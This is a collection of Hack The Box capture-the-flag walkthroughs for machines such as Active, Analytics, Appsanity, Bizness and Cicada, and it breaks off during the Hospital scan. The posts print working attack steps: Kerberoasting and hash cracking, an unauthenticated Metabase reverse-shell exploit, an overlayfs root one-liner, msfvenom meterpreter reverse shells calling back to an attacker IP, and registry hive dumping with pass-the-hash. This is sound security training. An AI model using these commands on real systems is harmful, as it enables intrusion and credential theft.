[{"title":"[HTB] Active","url":"/HTB/Active/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      eks & mrb3n\n    \n    \n      Release Date:\n      July 28, 2018\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconnmap$ nmap -sC -sV 10.10.10.100Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-05 21:32 WETNmap scan report for 10.10.10.100Host is up (0.059s latency).Not shown: 982 closed tcp ports (reset)PORT      STATE SERVICE       VERSION53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 21:37:17Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped49152/tcp open  msrpc         Microsoft Windows RPC49153/tcp open  msrpc         Microsoft Windows RPC49154/tcp open  msrpc         Microsoft Windows RPC49155/tcp open  msrpc         Microsoft Windows RPC49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc         Microsoft Windows RPC49165/tcp open  msrpc         Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   210: |_    Message signing enabled and required| smb2-time: |   date: 2023-11-05T21:38:15|_  start_date: 2023-11-05T21:16:04Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 356.13 seconds\n\nFootholdSMBIf we list all shares, we can see that the share ‘Replication’ can be read without a login\n$ smbmap -H 10.10.10.100\n\nBy exploring the Replication share, we can find Groups.xml in the following directory\n\n\\active.htb\\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml\n\n$ smbclient //10.10.10.100/Replicationcd active.htb\\Policies\\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\\MACHINE\\Preferences\\Groups\\get Groups.xml\ngpp-decryptWe can now open the file in our local machine.And we can find the user SVC_TGS and it’s encrypted password\n\n\n\nUser\nHashed Password\n\n\n\nSVC_TGS\nedBSHOwhZLTjt&#x2F;QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw&#x2F;NglVmQ\n\n\nWe can decrypt the password with gpp-decrypt\n$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n\n\n\n\nUser\nPassword\n\n\n\nSVC_TGS\nGPPstillStandingStrong2k18\n\n\nuser.txt flagWith the obtained login, we now have access to more shares\n$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100\n\nNow just get the user flag from SVC_TGS desktop\n$ smbclient //10.10.10.100/Users --user=active.htb/SVC_TGScd SVC_TGS\\Desktopget user.txt\n\nPrivEscAD EnumerationWe can use Impacket to enumerate the AD and get the Administrator’s password\nFirst we can use GetUserSPNs.py to list all users in the AD\n$ GetADUsers.py -all active.htb/SVC_TGS -dc-ip 10.10.10.100\n\nNow we can use GetUserSPNs.py to see if any users are configured with a Service Principal Name (SPNs), which if they are, can be exploited to get their hashed passwords.\n$ GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100\n\nAdministrator has been configured with SPN, so we can request the hashed password\n$ GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 -request\n\nHashed Administrator Password:\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$99a9dd2db5d42506d58d00a78e8a1a7f$02c3c483293fda1b6a78db5e73aaca413e25ec0e460649af4fd59973db4e23a386f9a08e4b16fd3dd658c2b93a4ecb691f709199a2e118b5eb024a0a71f4897f49fd9870e2d779914d4c2d803fcbe21f0169d3e4fe033cddc5ec738a5075f63b8e15433533bd91bc2137e1da914bef6646d800cae2a222d20e861d9f92e52fa7d7574b35be5fb38687cc5fb05dd694f54ec35a7090ec2e33596eec5592591e2c5fba102767afd0996fa40dc5ea56f97fdcb95d8856ff56b86c7e47fe27a54417211857ae991d75ac02ad72691fa5c0da60dc8dfb5680b795e49560dcb486ad84cb97d926fac1f4221fe25020c18686859e5d47ef1e47cf5644a2b96468d153bef80db6b5a55b14ccc50b972999c085b5599c0f8cafb829b733f4e6395621b112faa4c94d2a586efc235eb8cc5d4cf391ea9342aa37d0999e5a2f179a32d3a978fbc3cd1d432ea90f49bc6b7cec56c17764b9d8c6b738fa086ba9f0d1b6ccf07e88b340b16e1eeec43769649ef2b7575fab3dbfbe6c85ac29d7419c2bb4dae3f8e473e0e27f82d67a5159c65aaeddc666b9536f29bfdee6009e86c40786b56a4bedb4e8d0d62ccc904fba4741259a0a77dc5215f8274c482df2dfd21c057e22059a0da31ab4f7f7944926cf716fd5813fb555a1d2958c8785c2dc9d0adac347f1d667cb1d5736a5a5e6d8ca6927cfb69282348f574c79a41d09fcaf2012989006f36a54ff8255ba2febf22fe3d1db9f9440af840b1af1f794b7fddfe6a4e3f14f3e2cd147598c849674dedba85cffa181e6712a42c7c5104d0f5e827760f55f2cd321ad7e3e28eba49b35bcd115c62fe230f4f71f2834a308f87d77fd05525c41e2133c5aedf0314258493181bf54f5f16a6cefcd229553642c003414e8ade1b2720c696d6d37f9a4697765307cf9f5e5b3952b96ef8268bb84ccfc1562425915f88b412113c6d17665485c5a7e6192076941e7ad4b1c2ddc1f7c55c113603273beb788b5a31b9b872116729aeafed43828a8f7ef60604623da7dda0bb0226a80529654c24b47a71501360726ba64037a2bdaa462aa0fdcea2d4dbc3d9a68e65e332f4848784ad8f4cc78e8655d0bd3916eeed0c5b50ded80b4bef1dabadb18a6231faec50484942df4c137ee0157b3fb0b6fefcf5ab8ffe3cb1cc50ebb597e48d22b9492928c778bac322b33cc6c7d803d6943edb0b4ea2b79874adcb0eafece41d66114c047d5d946216a56875754c188bc898873261a174ae0\n\nPaste the hash into a .txt file and use john to decrypt it\n$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n\n\n\nUser\nPassword\n\n\n\nAdministrator\nTicketmaster1968\n\n\nroot.txt flagWith the Adminstrator login, we can get the root flag\n$ smbclient //10.10.10.100/Users --user=active.htb/Administratorcd Administrator\\Desktop\\get root.txt\n\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Analytics","url":"/HTB/Analytics/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      7u9y & TheCyberGeek\n    \n    \n      Release Date:\n      October 7, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\n\nReconnmap$ nmap -sC -sV 10.10.11.233\n\nWe can see there is a http page running on port 80Also we add the domain to the &#x2F;etc&#x2F;hosts file\n\nWeb PageAfter looking around the website, when I pressed the login button, it took me to the data.analytical.htb subdomainSo we update the hosts file again and we get a login page\n\nThe login page:\nAfter searching for a Metabase exploit, I came across CVE-2023-38646\nThis vulnerability allows us to execute code without any authentication\nExploitsetup-tokenWe head to the url specified in the previous link (data.analytical.htb&#x2F;api&#x2F;sessions&#x2F;properties) and search for setup-token\nAs we can see, the setup-token is leaking, which means it is vulnerable to the exploit\nRun the exploitDownload the exploit\nSetup a netcat listener.\n$ nc -lvnp 1234\n\nWhile the listener is running, run the exploit\n$ python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/ --lhost &lt;Attacker IP&gt; --lport 1234\n\nAfter the exploit runs, we get a shell as the user metabase.\nDocker ContainerWe are now in a docker container.However, if we check the environment variables, we get a user and password\n$ env\n\nSSH and user flagWe can now use the credentials obtained to ssh as the user metalytics\n$ ssh metalytics@10.10.11.233 \nWe are now logged in as metalytics.\n$ whoamimetalytics \nWe can now get the user.txt flag\n$ cat /home/metalytics/user.txta6c6422a0c214ffd37f50a632abeb48d\n\nPrivEscUbuntu LPENo sudo commands can be run.I searched for exploits on the running OS version, which is 22.04.2-Ubuntu\n$ uname -a\n\nI found this Ubuntu LPE exploit\nFirst i tried to run the command “id” and see if I would get root back\nunshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;os.setuid(0);os.system(&quot;id&quot;)&#x27;\nWe got the root id, which means the command is being executed as root\nSo I change the command to run a bash shell\nunshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;\n\nWe now have a shell as root\n$ whoamiroot\n\nAll we have left to do is get the root flag\n$ cat /root/root.txte7cea9c28a9c3460c2fd69964833561b\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Chemistry","url":"/HTB/Chemistry/","content":"\n  \n  \n    \n      \n      \n        Active Machine, Password Required.\n      \n    \n  \n\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Appsanity","url":"/HTB/Appsanity/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Hard\n    \n    \n      Author:\n      xRogue\n    \n    \n      Release Date:\n      October 28, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconnmap$ nmap -sC -sV 10.10.11.238Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 00:09 WETStats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 0.00% doneStats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 0.00% doneNmap scan report for 10.10.11.238Host is up (0.059s latency).Not shown: 998 filtered tcp ports (no-response)PORT    STATE SERVICE VERSION80/tcp  open  http    Microsoft IIS httpd 10.0|_http-title: Did not follow redirect to https://meddigi.htb/|_http-server-header: Microsoft-IIS/10.0443/tcp open  https?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.03 seconds\n\n\nHTTPS PageIf we head to https://10.10.11.238 we can see that the domain is meddigi.htbSo we change the &#x2F;etc&#x2F;hosts file and check out the web page\n&#x2F;etc&#x2F;hosts\nWeb Page\nIt also allows us to create an account, and when we do, we can see that it creates a patient profile\nffufIf we run ffuf to look for subdomains, we find a ‘portal’ subdomain\n$ ffuf -u &quot;https://meddigi.htb/&quot; -H &quot;Host: FUZZ.meddigi.htb&quot;  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n\nDon’t forget to update the hosts file\nFootholdDoctor AccountIf we head to https://portal.meddigi.htb, we can see that we can login with an email and a Doctor Ref. Number\nTo get a doctor account, we can capture the register request from when we create an account on the previous page, and change the account type\nNow if we login, we confirm that we have a Doctor account\nDoctor PanelNow we have a doctor account, but I did not find any “Doctor Ref.Number”However, we can use the access_token cookie from meddigi.htb, to login in portal.meddigi.htb\nNow we have access to the Doctor Panel\nSSRFThe “Issue Prescriptions” menu is vulnerable to SSRF on port 8080It opens a report list, and allows us to open the report file\nIf we copy the “View Report” link, the link looks like this:\n\nhttps://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf\n\nUploading RevShellIn the Doctor Panel there is also a “Upload Report” menu.However it only allows us to upload PDF files.We just need to create a .aspx reverse shell, and add the PDF header.\n$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.2  LPORT=1337 -f aspx -o revshell.aspx\nNow add the PDF header (%PDF-1.7%).\nWith the header, it allows us to upload the report.If we check the reports again using the SSRF found before, we can see the new report.\nCopy the “View Report” link and change the domain to http://127.0.0.1:8080It will look like something like this:\n\nhttp://127.0.0.1:8080/ViewReport.aspx?file=9c934f73-3fea-4b65-af6c-d6d6a960a0ff_revshell.aspx\n\nUser ShellFinally, to get our first shell in the machine, we setup a meterpreter listener\nuse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_httpsset LHOST 10.10.14.2set LPORT 1337set ExitOnSession falserun\n\nNow we just place the link to open the shell in the “Issue Prescriptions” menu and we get a shell\nNow we just get the user.txt flag\nLateral MovementReportManagement.exeIf we run netstat on the machine, we can see that there is a ReportManagement.exe running on port 100\nWe can port forward the port 100 to a port on our local machine, I used port 12345 in this caseAnd we use netcat on our machine to check what the application does\nWe will use this later\nExaminationManagement.dllIf we head to the directory \n\nC:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin\n\nWe can see a ExaminationManagement.dll file, if we decompile it, we can find a registry key that retrieves while running.\nDownload the .dll file\nThen I used dnSpy to decompile it, and we can find the registry key it accesses\ndevdoc loginIn the meterpreter session, we can retrieve that registry key with the following command:\nreg queryval -k HKLM\\\\Software\\\\MedDigi -v EncKey\nAnd we get what looks like to be a password\nIf we try that password on the following list of users\nIt works on the user devdoc\n\nPrivEscReportManagement.exeWe start by reverse engineering the ReportManagement.exe file that was running on port 100I downloaded the file and opened it in Ghidra\nIn Ghidra we can see that it accesses the directory:\n\nC:\\Program Files\\ReportManagement\\Libraries\n\n\nAnd opens a file called “externalupload”\n.dll RevShellThe externalupload file is a .dll file, and the user devdoc has permission to change the file.So we create a .dll reverse shell, and when we run the upload function on the ReportManagement.exe application, we can get a shell\nFirst create the .dll revshell\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1212 -f dll -o externalupload.dll\n\nAnd upload it to the Libraries folder\nAdmin ShellNow that the reverse shell is uploaded, we start a meterpreter listener\nuse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 10.10.14.2set LPORT 1212set ExitOnSession falserun\n\nWe run the application that we port forwarded to our local machine and use the upload function\nAnd finally we have a shell as Administrator\nNow we just get the root.txt flag\n","categories":["HTB"],"tags":["machine","hard"]},{"title":"[HTB] Bizness","url":"/HTB/Bizness/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      C4rm3l0\n    \n    \n      Release Date:\n      January 6, 2024\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconNmap$ nmap -sC -sV 10.10.11.252 -o nmap_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 20:03 WETNmap scan report for 10.10.11.252Host is up (0.062s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey: |   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)80/tcp  open  http     nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to https://bizness.htb/443/tcp open  ssl/http nginx 1.18.0| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.1|_http-title: Did not follow redirect to https://bizness.htb/|_http-server-header: nginx/1.18.0| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK| Not valid before: 2023-12-14T20:03:40|_Not valid after:  2328-11-10T20:03:40|_ssl-date: TLS randomness does not represent timeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nHTTP\n\n\n443\nHTTPS\n\n\nGobuster$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://bizness.htb/ -k --exclude-length 0===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     https://bizness.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] Exclude Length:          0[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/control              (Status: 200) [Size: 34633]\n\nFound &#x2F;control directory\nFootholdofbizWe now know ofbiz is running on the webserver.Doing some googling, I found this CVE.By using this POC we can get a shell.\nFirst make sure you are using openjdk 11\n$ update-alternatives --config java\n\nThen start a listener and run the POC\n$ python3 exploit.py https://bizness.htb/ shell 10.10.14.4:1337\n\nNow just get the user flag\nPrivEscHash DecryptLooking through ofbiz files, I came accross a directory with a huge list of .dat files.\nBy running strings on this directory and grepping for the word “Password”, we get a hashed password.\n\nDirectory: &#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0\n\n$ strings * | grep Password\n\nWith the following python script, we can decrypt this hash.\nimport hashlibimport base64# Function to hash a value using SHA1 with a provided saltdef sha1_hash_with_salt(value, salt):    hash_obj = hashlib.sha1()    hash_obj.update(salt.encode(&#x27;utf-8&#x27;))    hash_obj.update(value.encode(&#x27;utf-8&#x27;))    return hash_obj.digest()# Function to check if a hashed value matches a target hashdef check_hash(wordlist_file, target_hash, salt):    with open(wordlist_file, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as file:        for line in file:            password = line.strip()            hashed_password = sha1_hash_with_salt(password, salt)            encoded_hashed_password = base64.urlsafe_b64encode(hashed_password).decode(&#x27;utf-8&#x27;).replace(&#x27;=&#x27;, &#x27;&#x27;)            if encoded_hashed_password == target_hash:                print(f&#x27;Found Password: &#123;password&#125;&#x27;)                return        print(&#x27;Password not found in the wordlist.&#x27;)# Define the target hash and salttarget_hash = &#x27;uP0_QaVBpDWFeo8-dRzDqRwXQ2I&#x27;  # Remove &quot;$SHA1$d$&quot; and use only the hash valuesalt = &#x27;d&#x27;# Replace wordlist_file with the path to your wordlistwordlist_file = &#x27;/usr/share/wordlists/rockyou.txt&#x27;# Call the function to check the hash against the wordlistcheck_hash(wordlist_file, target_hash, salt)\n\n\nThis is the root password, just su to root and get the root flag\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Cicada","url":"/HTB/Cicada/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      theblxckcicada\n    \n    \n      Release Date:\n      September 28, 2024\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\nVideo Walkthrough\n\nReconNmapnmap -T4 -A -p- 10.10.11.35 -o initial_scan.nmap Nmap scan report for 10.10.11.35Host is up (0.041s latency).Not shown: 65522 filtered tcp ports (no-response)PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-04 05:06:15Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after:  2025-08-22T20:24:16|_ssl-date: TLS randomness does not represent time445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after:  2025-08-22T20:24:163268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after:  2025-08-22T20:24:16|_ssl-date: TLS randomness does not represent time3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after:  2025-08-22T20:24:16|_ssl-date: TLS randomness does not represent time5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.059896/tcp open  msrpc         Microsoft Windows RPCWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2022 (88%)OS CPE: cpe:/o:microsoft:windows_server_2022Aggressive OS guesses: Microsoft Windows Server 2022 (88%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled and required| smb2-time: |   date: 2025-03-04T05:07:09|_  start_date: N/A|_clock-skew: 6h59m59sTRACEROUTE (using port 139/tcp)HOP RTT      ADDRESS1   40.58 ms 10.10.14.12   41.44 ms 10.10.11.35OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Mar  3 22:07:49 2025 -- 1 IP address (1 host up) scanned in 189.08 seconds\n\n\nUserSMB Without PasswordWe can find two non default shares without using a password\nsmbclient -L \\\\\\\\10.10.11.35\\\\\n\nWe can access the HR share and download a file called “Notice from HR.txt”\nsmbclient \\\\\\\\10.10.11.35\\\\HRget &quot;Notice from HR.txt”\n\nFrom the file’s content, we get a password\n\nCicada$M6Corpb*@Lp#nZp!8\n\nRID EnumerationWith the obtained password, we can use ridenum to enumerate users through RID enumeration\nridenum 10.10.11.35 500 5000 &#x27;&#x27; &#x27;Cicada$M6Corpb*@Lp#nZp!8’\n\nWe now have a file with the new obtained usersWe can use NetExec to find out if any user uses the previously obtained password.\nnetexec smb 10.10.11.35 -u 10.10.11.35_users.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8’\n\nThe user ‘michael.wrightson’ uses the password ‘Cicada$M6Corpb*@Lp#nZp!8’, we can use this to try and enumerate more users\nnetexec smb 10.10.11.35 -d cicada.htb -u &#x27;michael.wrightson&#x27; -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; --users\nWe can see the password for the user ‘david.orelious’ in the user’s description\n\ndavid.orelious:aRt$Lp#7t*VQ!3\n\nEnumerate shares with the new credentials\nnetexec smb 10.10.11.35 -d cicada.htb -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --shares\n\nThis user has READ access to the “DEV” share\nsmbclient \\\\\\\\10.10.11.35\\\\DEV -U david.oreliousget Backup_script.ps1\n\n\nemily.oscars:Q!3@Lp#M6b7tVt\n\nNow we can get a shell as emily using evil-winrm\nevil-winrm -i 10.10.11.35 -u &#x27;emily.oscars&#x27; -p &#x27;Q!3@Lp#M6b*7t*Vt&#x27;\n\nPrivEscSeBackupPrivilgeIf we check the current user’s privileges, we can find the SeBackupPrivilege is enabled\nwhoami /priv\n\nBy googling privilege escalation with this privilege, we can find this blog postWith this privilege we can save a backup of the SAM and SYSTEM hives, and then transfer it to our machine to extract the hive secrets\nSo the first step is to save the backup of both hives (SAM and SYSTEM)\ncd c:\\mkdir Tempreg save hklm\\sam c:\\Temp\\samreg save hklm\\system c:\\Temp\\system`\n\nAnd then transfer both to our machine\ncd Tempdownload samdownload system`\n\nWith both files in our machine we can run pypykatz to extract the hive’s secrets\npypykatz registry --sam sam system\n\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\n\nWith the Administrator NTLM hash, we can just get a shell using evil-winrm\nevil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341\n\nRooted :)\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Hospital","url":"/HTB/Hospital/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Medium\n    \n    \n      Author:\n      ruycr4ft\n    \n    \n      Release Date:\n      November 18, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\nReconNmap$ nmap -sC -sV -T4 -Pn 10.10.11.241Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-20 23:28 WETNmap scan report for hospital.htb (10.10.11.241)Host is up (0.061s latency).Not shown: 980 filtered tcp ports (no-response)PORT     STATE SERVICE           VERSION22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 e14b4b3a6d18666939f7aa74b3160aaa (ECDSA)|_  256 96c1dcd8972095e7015f20a24361cbca (ED25519)53/tcp   open  domain            Simple DNS Plus88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-21 06:28:22Z)135/tcp  open  msrpc             Microsoft Windows RPC139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after:  2028-09-06T10:49:03443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after:  2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time|_http-title: Hospital Webmail :: Welcome to Hospital Webmail| tls-alpn: |_  http/1.1445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0636/tcp  open  ldapssl?| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after:  